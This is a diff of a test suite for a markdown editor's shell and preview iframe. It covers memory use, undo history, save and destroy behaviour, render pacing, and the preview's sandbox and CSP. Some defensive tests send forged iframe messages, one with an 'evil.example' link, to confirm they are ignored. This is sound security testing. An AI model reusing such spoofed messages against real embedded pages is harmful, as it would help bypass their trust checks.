@@ -21,12 +21,13 @@ import { pathToFileURL } from 'node:url';
 import { createHash } from 'node:crypto';
 import http from 'node:http';
 import vm from 'node:vm';
+import v8 from 'node:v8';
 import type { AddressInfo } from 'node:net';
 import {
   createEditorShell, textareaAdapter, codemirror6Adapter, createTextModel, toEditorText, minimalChange, createPreview, previewFrameDocument,
   lineToTop, topToLine, renderMarkdownPreview, isCodeMirror6Modules, PREVIEW_SANDBOX, PREVIEW_BRIDGE, CODEMIRROR6_URL, CODEMIRROR6_VERSIONS,
   CODEMIRROR6_INTEGRITY, CODEMIRROR6_BYTES, CODEMIRROR6_PATH, CODEMIRROR6_GLOBAL, EDITOR_CSS, PREVIEW_BRIDGE_HASH, previewScriptHashes,
-  previewSandbox, rewriteAssetUrls,
+  previewSandbox, rewriteAssetUrls, mapSrcset, renderMarkdownPreviewWithIncludes, undoSteps, detachString, loadCodeMirror6, CODEMIRROR6_HISTORY_STEPS,
   type EditorShell, type EditorShellOptions, type EdElement, type EdDocument, type EdFile, type RenderContext,
 } from '../src/carrier/editor';
 import { historyChars, undoTexts } from '../src/carrier/editor/adapter';
@@ -395,7 +396,7 @@ describe('the preview', () => {
     expect(f.iframe.attrs).toMatchObject({ sandbox: 'allow-scripts', title: 'Document preview' });
     expect(String(f.iframe.srcdoc)).toContain(PREVIEW_BRIDGE);
     expect(PREVIEW_BRIDGE).not.toMatch(/<\/?script/i);
-    expect(PREVIEW_BRIDGE).toContain('if(e.source!==P)return');
+    expect(PREVIEW_BRIDGE).toContain('if(e.source===P)handle(d)');
     p.render('<p>one</p>');
     expect(f.posted).toEqual([]);
     f.emit({ type: 'orz-preview-ready' }, f.frameWindow);
@@ -567,7 +568,7 @@ describe('instances', () => {
     const engine = textareaAdapter();
     const destroyEngine = vi.spyOn(engine, 'destroy');
     const m = mount({ render, adapter: engine }, ctx);
-    expect(added.sort()).toEqual(['message', 'resize']);
+    expect(added.sort()).toEqual(['blur', 'message', 'resize']);
     await tick(30);
     const calls = render.mock.calls.length;
     type(m, 'pending');
@@ -795,10 +796,13 @@ function valueImports(entry: string): Set<string> {
  * The whole entry is 1.17 MB with the parser, which header.ts brings in (kitParser); CodeMirror is not in it.
  * Bound ≈ +30 %.
  */
-const EDITOR_OWN_LIMIT = 57_000;
+/** The editor's own modules in the shipped (CommonJS dist) bundle: 51.8 KB before round 2 of closed loop 2, 64.9 KB after. */
+const EDITOR_OWN_LIMIT = 70_000;
+/** The whole shipped editor bundle (parser, one KaTeX, editor; no CodeMirror): 967 KB before round 2, 982 KB after. */
+const EDITOR_BUNDLE_LIMIT = 1_050_000;
 
 describe('module boundaries', () => {
-  it('[E.10] carrier/shell and carrier/read stay parser-free and do not import the editor; carrier does not either; the package exports ./carrier/editor; the editor\'s own code (without the parser and CodeMirror) bundles under 57 KB', async () => {
+  it('[E.10] carrier/shell and carrier/read stay parser-free and do not import the editor; carrier does not either; the package exports ./carrier/editor; what ships (the CommonJS dist entry, bundled) holds the editor\'s own code under 70 KB, the whole bundle under 1.05 MB with one KaTeX, and no CodeMirror', async () => {
     for (const entry of ['src/carrier/shell/index.ts', 'src/carrier/read.ts', 'src/carrier.ts', 'src/index.ts']) {
       expect([...valueImports(entry)].filter((f) => f.includes('carrier/editor')), entry).toEqual([]);
     }
@@ -807,13 +811,19 @@ describe('module boundaries', () => {
     const pkg = JSON.parse(readFileSync('package.json', 'utf8')) as { exports: Record<string, string>; files: string[] };
     expect(pkg.exports['./carrier/editor']).toBe('./dist/carrier/editor/index.js');
     expect(pkg.files).toContain('vendor');
-    // the editor's own modules (the parser and the preview libraries' wiring come from the rest of the package)
+    // What ships (item 17): the CommonJS dist entry, bundled as a carrier bundles `orz-markdown/carrier/editor`.
+    // The editor's own modules, and the whole bundle with the parser and ONE KaTeX (an ESM bundle of src would
+    // carry two: `katex/contrib/mhchem` resolves to katex.mjs there while the plugin requires katex.js).
     const { build } = await import('esbuild');
-    const out = await build({ entryPoints: ['src/carrier/editor/index.ts'], bundle: true, minify: true, platform: 'browser', format: 'esm', write: false, logLevel: 'silent', metafile: true });
+    const shipped = existsSync('dist/carrier/editor/index.js');
+    const entry = shipped ? 'dist/carrier/editor/index.js' : 'src/carrier/editor/index.ts';
+    const out = await build({ entryPoints: [entry], bundle: true, minify: true, platform: 'browser', format: 'esm', write: false, logLevel: 'silent', metafile: true });
     const own = Object.entries(out.metafile!.outputs)[0][1].inputs;
-    const editorBytes = Object.entries(own).filter(([f]) => f.startsWith('src/carrier/editor/')).reduce((n, [, v]) => n + v.bytesInOutput, 0);
+    const editorBytes = Object.entries(own).filter(([f]) => f.startsWith(shipped ? 'dist/carrier/editor/' : 'src/carrier/editor/')).reduce((n, [, v]) => n + v.bytesInOutput, 0);
     expect(editorBytes).toBeLessThan(EDITOR_OWN_LIMIT);
+    expect(out.outputFiles[0].contents.byteLength).toBeLessThan(EDITOR_BUNDLE_LIMIT);
     expect(Object.keys(own).filter((f) => f.includes('@codemirror') || f.includes('vendor/'))).toEqual([]);
+    if (shipped) expect(Object.keys(own).filter((f) => /katex\/dist\/katex\.m?js$/.test(f))).toHaveLength(1);
     if (existsSync('dist/carrier/editor/index.js')) {
       const dist = (await import('../dist/carrier/editor/index.js')) as Record<string, unknown>;
       expect(typeof dist.createEditorShell).toBe('function');
@@ -1113,7 +1123,7 @@ describe('preview rendering (B-5, B-9, B-11, item 11)', () => {
     }
     const src = readFileSync('src/carrier/editor/preview.ts', 'utf8');
     expect(src.match(/setAttribute\('sandbox'/g)).toHaveLength(1);
-    expect(src).toContain("iframe.setAttribute('sandbox', previewSandbox(");
+    expect(src).toMatch(/\bf\.setAttribute\('sandbox', previewSandbox\(/); // in makeFrame, the one place every preview iframe is made
     for (const f of ['adapter', 'codemirror6', 'index', 'preview', 'render-md', 'shell', 'styles', 'text-model', 'types']) {
       const code = readFileSync(`src/carrier/editor/${f}.ts`, 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, ''); // code, not comments
       if (f === 'preview') expect(code.match(/allow-same-origin/g), f).toHaveLength(1); // previewSandbox's file: case only
@@ -1380,6 +1390,694 @@ describe('engine history (B-19)', () => {
   });
 });
 
+// ── closed loop 2, round 2 ───────────────────────────────────────────────
+
+/** `gc()` without the --expose-gc flag (V8 lets a running process turn it on), or null. */
+function exposeGc(): (() => void) | null {
+  try {
+    v8.setFlagsFromString('--expose_gc');
+    const gc = vm.runInNewContext('gc') as unknown;
+    return typeof gc === 'function' ? (gc as () => void) : null;
+  } catch {
+    return null;
+  }
+}
+const heapNow = (gc: (() => void) | null): number => { gc?.(); gc?.(); return process.memoryUsage().heapUsed; };
+/** A fresh flat copy of a string (as a textarea's `value` is: no tie to the string it was built from). */
+const flat = (s: string): string => Buffer.from(s, 'utf8').toString('utf8');
+
+/** A textarea stand-in for Node: `value` is whatever the test sets, input events fire on demand. */
+function fakeTextarea() {
+  const ls: Record<string, Array<(e: unknown) => void>> = {};
+  const ta = {
+    value: '', selectionStart: 0, selectionEnd: 0, readOnly: false, className: '',
+    setAttribute() {}, remove() {},
+    addEventListener(t: string, f: (e: unknown) => void) { (ls[t] ??= []).push(f); },
+    removeEventListener() {},
+    setSelectionRange(a: number, b: number) { ta.selectionStart = a; ta.selectionEnd = b; },
+    fire(t: string, e: unknown) { for (const f of ls[t] ?? []) f(e); },
+  };
+  const el = { ownerDocument: { createElement: () => ta }, append() {} } as unknown as EdElement;
+  return { ta, el };
+}
+
+describe('memory (round 2: F4, MED3, cost-1, cost-2)', () => {
+  const asciiBig = (n: number) => { let t = ''; let i = 0; while (t.length < n) t += `Paragraph ${i++} of a long document, with words enough to wrap.\n\n`; return t.slice(0, n); };
+
+  it('[E.24] the initial and the saved text are remembered outside the window of recent texts: 17 header edits of a mixed-line-ending document undone back read exactly the original and clean; a saved text is exact after 20 more edits', () => {
+    const text = '{{nyml\r\nkind: document\r\ntheme: t0\r\n}}\r\n\r\nline one\nline two\rline three\r\n';
+    const m = mount({ text });
+    for (let n = 1; n <= 17; n++) m.shell.setHeader({ theme: `t${n}` });
+    let undos = 0;
+    while (m.shell.undo()) undos++;
+    expect(undos).toBe(17);
+    expect(m.shell.getText()).toBe(text);
+    expect(m.shell.isDirty()).toBe(false);
+    // the saved text: a mixed one, saved, then 20 edits (more than the window), undone back: exact and clean
+    for (let n = 1; n <= 3; n++) m.shell.setHeader({ theme: `s${n}` });
+    m.shell.markSaved();
+    const saved = m.shell.getText();
+    expect(saved).toContain('line one\nline two\rline three');
+    for (let n = 1; n <= 20; n++) m.shell.setHeader({ theme: `u${n}` });
+    expect(m.shell.isDirty()).toBe(true);
+    for (let n = 0; n < 20; n++) m.shell.undo();
+    expect(m.shell.getText()).toBe(saved);
+    expect(m.shell.isDirty()).toBe(false);
+    m.shell.destroy();
+    // the model itself: the initial text survives any number of adopted texts; clear() forgets everything
+    const model = createTextModel('a\r\nb\nc');
+    for (let i = 0; i < 40; i++) model.adopt(`x${i}\r\ny`);
+    expect(model.toExact('a\nb\nc')).toBe('a\r\nb\nc');
+    model.markSaved('s\rt\nu');
+    for (let i = 0; i < 40; i++) model.adopt(`z${i}\n`);
+    expect(model.isSaved('s\nt\nu')).toBe(true);
+    expect(model.toExact('s\nt\nu')).toBe('s\rt\nu');
+    model.clear();
+    expect(model.toExact('a\nb\nc')).not.toBe('a\r\nb\nc');
+  });
+
+  it('[E.24] a remembered text costs one copy unless its line endings are mixed: 60 setText of a 1.25 MB CR LF text keep under 24 copies (they kept 32 before), and destroy() lets them go', () => {
+    const gc = exposeGc();
+    const crlf = asciiBig(1_250_000).replace(/\n/g, '\r\n');
+    const h0 = heapNow(gc);
+    const model = createTextModel(flat(crlf));
+    for (let i = 0; i < 60; i++) model.adopt(flat(`${crlf.slice(0, 1000)}edit ${i}${crlf.slice(1000)}`));
+    const held = (heapNow(gc) - h0) / crlf.length; // one-byte strings: bytes = characters
+    model.clear();
+    const after = (heapNow(gc) - h0) / crlf.length;
+    expect(gc).not.toBeNull();
+    expect(held).toBeLessThan(24);
+    expect(held).toBeGreaterThan(10); // the measurement sees the remembered texts at all
+    expect(after).toBeLessThan(3);
+    // exact strings only for mixed line endings: a CR LF text reads back exactly without one
+    const m2 = createTextModel('﻿a\r\nb\r\n');
+    expect(m2.toExact('a\nb\n')).toBe('﻿a\r\nb\r\n');
+  }, 60_000);
+
+  it('[E.21] the textarea history keeps no whole text in its patches (V8 slices keep their parent alive): 100 steps deleting 20 characters, and 100 replacing 30, of a 1.25 MB text hold under 4 copies of it on the heap (100 before)', () => {
+    const gc = exposeGc();
+    const big = asciiBig(1_250_000);
+    let now = 0;
+    const clock = vi.spyOn(Date, 'now').mockImplementation(() => (now += 1000)); // every input its own undo step
+    try {
+      for (const kind of ['delete', 'replace'] as const) {
+        const { ta, el } = fakeTextarea();
+        const a = textareaAdapter();
+        const h0 = heapNow(gc);
+        a.mount(el, { doc: flat(big), onChange() {} });
+        for (let i = 0; i < 100; i++) {
+          const v = ta.value;
+          const at = 1000 + ((i * 7919) % (v.length - 2000));
+          const [to, ins, inputType] = kind === 'delete' ? [at + 20, '', 'deleteContentBackward'] : [at + 30, `replacement ${i}`, 'insertText'];
+          ta.value = flat(v.slice(0, at) + ins + v.slice(to));
+          ta.setSelectionRange(at + ins.length, at + ins.length);
+          ta.fire('input', { inputType });
+        }
+        const copies = (heapNow(gc) - h0) / big.length;
+        expect(gc).not.toBeNull();
+        expect(copies, kind).toBeLessThan(4);
+        // and the history still walks back exactly
+        const steps = undoTexts(a)!;
+        expect(steps).toHaveLength(100);
+        expect(steps[0]).toBe(big);
+        a.destroy();
+      }
+    } finally {
+      clock.mockRestore();
+    }
+    // detachString makes a copy that shares nothing with its parent
+    expect(detachString('x'.repeat(40))).toBe('x'.repeat(40));
+    const b = `abc${'X'.repeat(29)}yz`;
+    expect(minimalChange('abcdefghijklmnopqrstuvwxyz', b)).toEqual({ from: 3, to: 24, insert: b.slice(3, -2) });
+  }, 120_000);
+
+  it('[E.21] an engine taking over replays only the newest steps: undoSteps(limit) gives the text that many undos back and one forward change per step, which rebuild every text exactly', () => {
+    const { ta, el } = fakeTextarea();
+    const a = textareaAdapter();
+    let now = 0;
+    const clock = vi.spyOn(Date, 'now').mockImplementation(() => (now += 1000));
+    try {
+      a.mount(el, { doc: 'start\n', onChange() {} });
+      for (let i = 0; i < 30; i++) {
+        const v = ta.value;
+        const at = (i * 5) % (v.length + 1);
+        ta.value = i % 3 === 2 ? v.slice(0, Math.max(0, at - 2)) + v.slice(at) : v.slice(0, at) + `<${i}>` + v.slice(at);
+        ta.setSelectionRange(0, 0);
+        ta.fire('input', { inputType: i % 3 === 2 ? 'deleteContentBackward' : 'insertText' });
+      }
+    } finally {
+      clock.mockRestore();
+    }
+    const texts = [...undoTexts(a)!, a.getDoc()];
+    const apply = (t: string, c: { from: number; to: number; insert: string }) => t.slice(0, c.from) + c.insert + t.slice(c.to);
+    for (const limit of [0, 1, 7, 30, 100]) {
+      const { base, changes } = undoSteps(a, limit)!;
+      const n = Math.min(limit, 30);
+      expect(base).toBe(texts[30 - n]);
+      expect(changes).toHaveLength(n);
+      let t = base;
+      changes.forEach((c, i) => { t = apply(t, c); expect(t).toBe(texts[30 - n + i + 1]); });
+    }
+    expect(CODEMIRROR6_HISTORY_STEPS).toBe(100);
+    a.destroy();
+  });
+});
+
+describe('the standalone save proves the opened file (round 2)', () => {
+  it('[E.8] the standalone saver gets the opened file\'s bytes as openedHtml: by default assemble() of the text the shell was mounted with (not the edited text); an openedHtml option replaces it', async () => {
+    const g = globalThis as unknown as Record<string, unknown>;
+    const had = Object.prototype.hasOwnProperty.call(g, 'window');
+    const prev = g.window;
+    const written: string[] = [];
+    const run = async (extra: Partial<EditorShellOptions>) => {
+      const assembled = (t: string) => `<html>${t}</html>`;
+      const assemble = vi.fn(assembled);
+      const handle = {
+        name: 'doc.md.html',
+        getFile: async () => ({ text: async () => assembled('a\r\n') }),
+        createWritable: async () => ({ write: async (h: string) => { written.push(h); }, close: async () => {} }),
+      };
+      g.window = { location: { protocol: 'file:', href: 'file:///d/doc.md.html', pathname: '/d/doc.md.html', origin: 'null' }, showSaveFilePicker: async () => handle };
+      const m = mount({ text: 'a\r\n', assemble, fileName: 'doc.md.html', ...extra });
+      type(m, 'b');
+      const r = await m.shell.save();
+      m.shell.destroy();
+      return { r, texts: assemble.mock.calls.map((c) => c[0]) };
+    };
+    try {
+      const plain = await run({});
+      expect(plain.r).toEqual({ ok: true, via: 'file' });
+      expect(plain.texts).toEqual(['a\r\nb', 'a\r\n']); // the save, then the proof of the opened file
+      expect(written).toEqual(['<html>a\r\nb</html>']);
+      const opened = vi.fn(() => '<html>given</html>');
+      const given = await run({ openedHtml: opened });
+      expect(given.r).toEqual({ ok: true, via: 'file' });
+      expect(given.texts).toEqual(['a\r\nb']);
+      expect(opened).toHaveBeenCalledTimes(1);
+    } finally {
+      if (had) g.window = prev; else delete g.window;
+    }
+  });
+});
+
+describe('work in flight and after destroy (round 2: F3/#11, LOW7)', () => {
+  it('[E.18] requestAi, uploadAssets and ensureUid check read-only and destroy after every wait: a proposal, an upload or a uid that arrives after setReadOnly(true) or destroy() changes nothing, and uploads stop calling the hook', async () => {
+    const later = <T,>() => { let release!: (v: T) => void; const p = new Promise<T>((r) => { release = r; }); return { p, release }; };
+    for (const end of ['readOnly', 'destroy'] as const) {
+      const finish = (m: Mounted) => (end === 'readOnly' ? m.shell.setReadOnly(true) : m.shell.destroy());
+      const ai = later<{ proposed: string }>();
+      const a = mount({ text: 'a\r\nb\r\n', hooks: { ai: { operations: [{ id: 'tidy', title: 'Tidy', selection: false }], request: () => ai.p } } });
+      const pa = a.shell.requestAi('tidy');
+      await tick(5);
+      finish(a);
+      ai.release({ proposed: 'AI TEXT\n' });
+      expect(await pa).toEqual({ ok: false, error: end === 'readOnly' ? 'read-only' : 'destroyed' });
+      expect(a.shell.getText()).toBe('a\r\nb\r\n');
+      a.shell.destroy();
+      const up = later<string>();
+      const uploadAsset = vi.fn(() => up.p);
+      const u = mount({ text: 'a\r\nb\r\n', hooks: { uploadAsset } });
+      const errors: string[] = [];
+      u.shell.on('error', (e) => errors.push(e.source));
+      const pu = u.shell.uploadAssets([{ name: 'x.png', type: 'image/png', size: 1 }, { name: 'y.png', type: 'image/png', size: 1 }]);
+      await tick(5);
+      finish(u);
+      up.release('assets/x.png');
+      expect(await pu).toMatchObject({ ok: false, inserted: [] });
+      expect(uploadAsset).toHaveBeenCalledTimes(1); // the second file is not uploaded
+      expect(u.shell.getText()).toBe('a\r\nb\r\n');
+      expect(errors).toEqual([]);
+      u.shell.destroy();
+      const mint = later<string>();
+      const d = mount({ text: '# x\n', hooks: { mintUid: () => mint.p } });
+      const pd = d.shell.ensureUid();
+      await tick(5);
+      finish(d);
+      mint.release('doc-hostminted00001');
+      await expect(pd).rejects.toThrow(end === 'readOnly' ? /read-only/ : /destroyed/);
+      expect(d.shell.getText()).toBe('# x\n');
+      d.shell.destroy();
+    }
+  });
+
+  it('[E.18] ensureUid: a uid set while the host mints one wins — it is returned and the minted one is not written', async () => {
+    let release!: (v: string) => void;
+    const m = mount({ text: '# x\n', hooks: { mintUid: () => new Promise<string>((r) => { release = r; }) } });
+    const p = m.shell.ensureUid();
+    await tick(5);
+    m.shell.setHeader({ uid: UID_B });
+    release('doc-hostminted00001');
+    expect(await p).toBe(UID_B);
+    expect(m.shell.getText()).toContain(`uid: ${UID_B}`);
+    expect(m.shell.getText()).not.toContain('doc-hostminted00001');
+    m.shell.destroy();
+  });
+
+  it('[E.7] after destroy(): getText() is the text as it was, setText/setHeader/markSaved/undo do nothing, and a save hook that finishes later posts nothing to the host (no dirty message, no event)', async () => {
+    let release!: () => void;
+    const dirtyPosts: boolean[] = [];
+    const host = { connected: () => true, setDirty: (d: boolean) => { dirtyPosts.push(d); } } as unknown as HostConnection;
+    const m = mount({ text: 'a\r\n', host, hooks: { save: () => new Promise<void>((r) => { release = r; }) } });
+    type(m, 'b');
+    expect(dirtyPosts).toEqual([true]);
+    const events: string[] = [];
+    m.shell.on('save', () => events.push('save'));
+    m.shell.on('dirty', () => events.push('dirty'));
+    const saving = m.shell.save();
+    await tick(5);
+    m.shell.destroy();
+    release();
+    await saving;
+    expect(dirtyPosts).toEqual([true]);
+    expect(events).toEqual([]);
+    expect(m.shell.getText()).toBe('a\r\nb');
+    m.shell.setText('other');
+    m.shell.setHeader({ title: 'x' });
+    m.shell.markSaved();
+    expect([m.shell.undo(), m.shell.redo(), m.shell.getText(), m.shell.isDirty()]).toEqual([false, false, 'a\r\nb', true]);
+  });
+});
+
+describe('preview pacing, navigation, channel (round 2: B#3, LOW6, B#4, B#8)', () => {
+  it('[E.16] a render runs until the frame acknowledges it (orz-preview-rendered with its id) and the pause counts the frame\'s time: with a frame that takes 200 ms, a keystroke every 30 ms renders a few times, never two at once in the frame', async () => {
+    const m = mount({ render: (t) => `<p>${t.length}</p>`, preview: { assets: false, debounceMs: 10 } });
+    const f = frameOf(m);
+    let inFrame = 0;
+    let most = 0;
+    let renders = 0;
+    const cw = m.root.querySelector('iframe')!.contentWindow as unknown as { postMessage(x: Record<string, unknown>): void };
+    cw.postMessage = (msg: Record<string, unknown>) => {
+      if (msg.type !== 'orz-preview-render') return;
+      renders++;
+      inFrame++;
+      most = Math.max(most, inFrame);
+      setTimeout(() => { inFrame--; f.say({ type: 'orz-preview-rendered', id: msg.id, anchors: [], max: 0 }); }, 200);
+    };
+    f.say({ type: 'orz-preview-ready' });
+    await tick(300);
+    const before = renders;
+    for (let i = 0; i < 50; i++) { type(m, 'x'); await tick(30); } // 1.5 s of typing
+    await tick(1200);
+    const during = renders - before;
+    expect(most).toBe(1);
+    expect(during).toBeGreaterThanOrEqual(2); // and the preview does not wait for the typing to stop (LOW6)
+    expect(during).toBeLessThanOrEqual(5); // without the frame's time it rendered after almost every key
+    m.shell.destroy();
+  });
+
+  it('[E.16] while edits continue, a render runs at least every max(1000 ms, 4 × the last render): 2.4 s of keystrokes every 60 ms (under the 150 ms pause) render during the typing', async () => {
+    const render = vi.fn((t: string) => `<p>${t.length}</p>`);
+    const m = mount({ render, preview: { assets: false, debounceMs: 150 } });
+    frameOf(m).say({ type: 'orz-preview-ready' });
+    await tick(250);
+    const before = render.mock.calls.length;
+    for (let i = 0; i < 40; i++) { type(m, 'k'); await tick(60); }
+    const during = render.mock.calls.length - before;
+    expect(during).toBeGreaterThanOrEqual(2);
+    expect(during).toBeLessThanOrEqual(4);
+    m.shell.destroy();
+  });
+
+  it('[E.15] in navigate mode a view change that shows the preview posts the caret\'s line (again once the preview has rendered)', async () => {
+    const m = mount({ text: 'a\nb\nc\nd\ne\nf\n', mode: 'editor', preview: { assets: false, debounceMs: 5, mode: 'navigate' } });
+    const f = frameOf(m);
+    f.say({ type: 'orz-preview-ready' });
+    m.ta().setSelectionRange(8, 8); // line 4
+    m.shell.setMode('preview');
+    expect(f.posted.filter((x) => x.type === 'orz-preview-navigate').at(-1)).toEqual({ type: 'orz-preview-navigate', line: 4 });
+    await tick(30);
+    const r = f.posted.find((x) => x.type === 'orz-preview-render')!;
+    const n = f.posted.length;
+    f.say({ type: 'orz-preview-rendered', id: r.id, anchors: [], max: 0 });
+    expect(f.posted.slice(n)).toContainEqual({ type: 'orz-preview-navigate', line: 4 });
+    m.shell.setMode('editor');
+    m.ta().setSelectionRange(2, 2);
+    m.shell.setMode('split');
+    expect(f.posted.filter((x) => x.type === 'orz-preview-navigate').at(-1)).toEqual({ type: 'orz-preview-navigate', line: 1 });
+    m.shell.destroy();
+  });
+
+  it('[E.25] shell.preview: post() reaches the frame (only once ready), on(type) hears the frame\'s messages of that type, setOptions({ head, scheme }) rebuilds the frame document and shows the last HTML again on the new ready', async () => {
+    const m = mount({ render: () => '<p>x</p>' });
+    const f = frameOf(m);
+    expect(m.shell.preview.post({ type: 'x-slides-go', delta: 1 })).toBe(false);
+    f.say({ type: 'orz-preview-ready' });
+    await tick(30);
+    expect(m.shell.preview.post({ type: 'x-slides-go', delta: 1 })).toBe(true);
+    expect(f.posted.at(-1)).toEqual({ type: 'x-slides-go', delta: 1 });
+    const heard: unknown[] = [];
+    const off = m.shell.preview.on('x-slides-at', (msg) => heard.push(msg.index));
+    f.say({ type: 'x-slides-at', index: 3 });
+    f.say({ type: 'other', index: 9 });
+    off();
+    f.say({ type: 'x-slides-at', index: 4 });
+    expect(heard).toEqual([3]);
+    const iframe = m.root.querySelector('iframe')!;
+    m.shell.preview.setOptions({ head: '<link rel="stylesheet" href="theme-2.css">', scheme: 'dark' });
+    expect(iframe.srcdoc).toContain('href="theme-2.css"');
+    expect(iframe.srcdoc).toContain('data-scheme="dark"');
+    expect(m.shell.preview.post({ type: 'x' })).toBe(false); // reloading
+    const f2 = frameOf(m);
+    f2.say({ type: 'orz-preview-ready' });
+    expect(f2.posted).toContainEqual(expect.objectContaining({ type: 'orz-preview-render', html: '<p>x</p>' }));
+    m.shell.destroy();
+    expect(m.shell.preview.post({ type: 'x' })).toBe(false);
+  });
+
+  it('[E.25] the default bridge goes before every stylesheet and finds #orz-doc when a render arrives; it calls the page hooks __orzPreviewApply / __orzPreviewNavigate / __orzPreviewMessage and exposes __orzPreview.report; a carrier\'s own bridge keeps its place after the article', () => {
+    const full = previewFrameDocument({ head: '<link rel="stylesheet" href="slow.css">' });
+    const bridgeAt = full.indexOf(PREVIEW_BRIDGE);
+    expect(bridgeAt).toBeGreaterThan(0);
+    expect(bridgeAt).toBeLessThan(full.indexOf('<link'));
+    expect(bridgeAt).toBeLessThan(full.indexOf('id="orz-doc"'));
+    for (const hook of ['__orzPreviewApply', '__orzPreviewNavigate', '__orzPreviewMessage', '__orzPreview={report:report']) expect(PREVIEW_BRIDGE).toContain(hook);
+    const custom = previewFrameDocument({ assets: false, bridge: 'void 0', head: '<link rel="stylesheet" href="t.css">' });
+    expect(custom.indexOf('<script>void 0</script>')).toBeGreaterThan(custom.indexOf('id="orz-doc"'));
+    // paused scripts: the CSP meta comes first in <head>, then the bridge, all scripts nonce-stamped
+    const paused = previewFrameDocument({ pauseScripts: 'n0nce', head: '<link rel="stylesheet" href="t.css">' });
+    expect(paused).toMatch(/<head><meta charset="utf-8"><meta name="viewport"[^>]*><meta http-equiv="Content-Security-Policy" content="script-src 'nonce-n0nce' 'strict-dynamic'"><script nonce="n0nce">/);
+    for (const t of paused.match(/<(script|link)\b[^>]*>/g)!) expect(t).toContain('nonce="n0nce"');
+  });
+});
+
+describe('the preview channel and the frame\'s claims (round 2: F1, B#10)', () => {
+  /** A fake window with MessageChannel: the transferred port and what goes through it. */
+  function portPage() {
+    const f = fakePreviewPage();
+    const toFrame: unknown[] = [];
+    let frameSide: { onmessage: ((e: { data: unknown }) => void) | null } | null = null;
+    const shellSide = { onmessage: null as ((e: { data: unknown }) => void) | null, postMessage: (m: unknown) => { toFrame.push(m); }, close() {} };
+    (f.doc.defaultView as unknown as Record<string, unknown>).MessageChannel = class { port1 = shellSide; port2 = { onmessage: null }; constructor() { frameSide = this.port2 as never; } };
+    const transfers: unknown[] = [];
+    f.frameWindow.postMessage = (m: unknown, _o?: unknown, t?: unknown[]) => { f.posted.push(m); if (t) transfers.push(...t); };
+    const fromBridge = (data: unknown) => shellSide.onmessage?.({ data });
+    return { ...f, toFrame, transfers, fromBridge, frameSide: () => frameSide };
+  }
+
+  it('[E.5] a ready that carries a channel gets a private MessageChannel port; the shell then talks through it, and the bridge\'s reports count only through it — the same message types posted on the window are ignored', () => {
+    const f = portPage();
+    const seen: unknown[] = [];
+    const p = createPreview(f.doc, f.parent, { assets: false }, {
+      onKey: (k, trusted) => seen.push(['key', k, trusted]), onLink: (h, trusted) => seen.push(['link', h, trusted]), onActive: (i, trusted) => seen.push(['active', i, trusted]),
+      onFocus: (reader) => seen.push(['focus', reader]),
+    });
+    p.render('<p>one</p>');
+    f.emit({ type: 'orz-preview-ready', channel: 'tok' }, f.frameWindow);
+    expect(f.posted).toEqual([{ type: 'orz-preview-port', channel: 'tok' }]);
+    expect(f.transfers).toHaveLength(1);
+    expect(f.toFrame).toEqual([{ type: 'orz-preview-render', id: 1, html: '<p>one</p>' }]);
+    expect(p.authenticated).toBe(true);
+    // forged on the window: ignored
+    f.emit({ type: 'orz-preview-key', key: 's' }, f.frameWindow);
+    f.emit({ type: 'orz-preview-link', href: 'https://evil.example/' }, f.frameWindow);
+    f.emit({ type: 'orz-preview-active', input: 'pointer' }, f.frameWindow);
+    f.emit({ type: 'orz-preview-focus', reader: true }, f.frameWindow);
+    expect(seen).toEqual([]);
+    // the bridge's own reports through the port
+    f.fromBridge({ type: 'orz-preview-key', key: 's' });
+    f.fromBridge({ type: 'orz-preview-link', href: 'https://example.org/' });
+    f.fromBridge({ type: 'orz-preview-active', input: 'pointer' });
+    f.fromBridge({ type: 'orz-preview-focus', reader: false });
+    expect(seen).toEqual([['key', 's', true], ['link', 'https://example.org/', true], ['active', 'pointer', true], ['focus', false]]);
+    p.scrollTo(40);
+    expect(f.toFrame.at(-1)).toEqual({ type: 'orz-preview-scroll', top: 40 });
+    p.destroy();
+    // a carrier's own bridge (no channel): window messages, untrusted
+    const g = fakePreviewPage();
+    const seen2: unknown[] = [];
+    const q = createPreview(g.doc, g.parent, { assets: false }, { onKey: (k, trusted) => seen2.push([k, trusted]) });
+    g.emit({ type: 'orz-preview-ready' }, g.frameWindow);
+    g.emit({ type: 'orz-preview-key', key: 's' }, g.frameWindow);
+    expect([q.authenticated, seen2]).toEqual([false, [['s', false]]]);
+    q.destroy();
+  });
+
+  it('[E.5] the bridge takes the port in a capture listener registered first and hides it from the frame\'s other listeners, sends through Reflect.apply and MessagePort.prototype.postMessage as they were when it started, and reports keys, links, input and scrolls only for trusted events', () => {
+    expect(() => new vm.Script(PREVIEW_BRIDGE)).not.toThrow(); // it parses (a syntax slip leaves the preview blank)
+    expect(PREVIEW_BRIDGE.indexOf('window.addEventListener("message"')).toBeLessThan(PREVIEW_BRIDGE.indexOf('function '));
+    expect(PREVIEW_BRIDGE).toContain('e.stopImmediatePropagation();if(!port&&d.channel===chan');
+    expect(PREVIEW_BRIDGE).toContain('var RA=Reflect.apply,PM=typeof MessagePort==="function"?MessagePort.prototype.postMessage:null');
+    expect(PREVIEW_BRIDGE).toContain('RA(PM,port,[m])');
+    for (const guard of ['if(e.isTrusted){pointed();active("pointer")}', 'if(e.target!==window||!e.isTrusted||has)return;has=true;var r=Date.now()-lastIn<1000', 'reader:true,late:true', '{send({type:"orz-preview-pong",id:d.id,pointer:lastPtr>=bareAt})}', 'document.addEventListener("keydown",function(e){if(!e.isTrusted)return;', 'if(e.isTrusted)send({type:"orz-preview-link"', 'if(!e.isTrusted||Date.now()<mute']) expect(PREVIEW_BRIDGE).toContain(guard);
+    expect(PREVIEW_BRIDGE).toContain('window.__orzPreview={report:report,post:post}'); // post: a window message, never the port
+  });
+
+  it('[E.14] focus a document script takes from the editor goes back at once; the shell asks the bridge whether the reader\'s pointerdown followed (Chrome may focus the frame first) and, when not, pauses the document\'s scripts in a new preview frame (a CSP that runs only the frame\'s nonce-stamped scripts) with a quiet note and an error (render); focus the reader\'s pointer (in the frame, or a press on the preview pane in the page), a Tab in the page or the shell\'s own focus() brought is left alone; a forged focus report or answer changes nothing', async () => {
+    const m = mount();
+    let shellPort: { onmessage: ((e: { data: unknown }) => void) | null; sent: Array<Record<string, unknown>> } | null = null;
+    (m.win as unknown as Record<string, unknown>).MessageChannel = class {
+      port1 = { onmessage: null, sent: [] as Array<Record<string, unknown>>, postMessage(x: Record<string, unknown>) { this.sent.push(x); }, close() {} };
+      port2 = {};
+      constructor() { shellPort = this.port1; }
